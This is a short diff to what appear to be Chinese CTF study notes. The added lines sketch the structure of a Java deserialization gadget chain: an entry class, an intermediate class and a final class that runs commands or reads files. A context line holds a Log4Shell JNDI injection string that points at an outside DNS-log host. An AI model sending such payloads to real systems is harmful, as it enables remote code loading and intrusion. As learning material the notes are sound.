@@ -532,7 +532,16 @@ ${jndi:ldap://wffsr5.dnslog.cn:9999}
 ## java反序列化
 #java反序列化 
 
+入口类: 
+- 实现了serialize接口
+- 重写了readObject方法
+- 接收任意对象作为参数
+中间类:
+- 实现了serialize接口
+- 接收集合类型
 
+最终类:
+- 命令执行或文件读取
 
 ### web846
 ```java
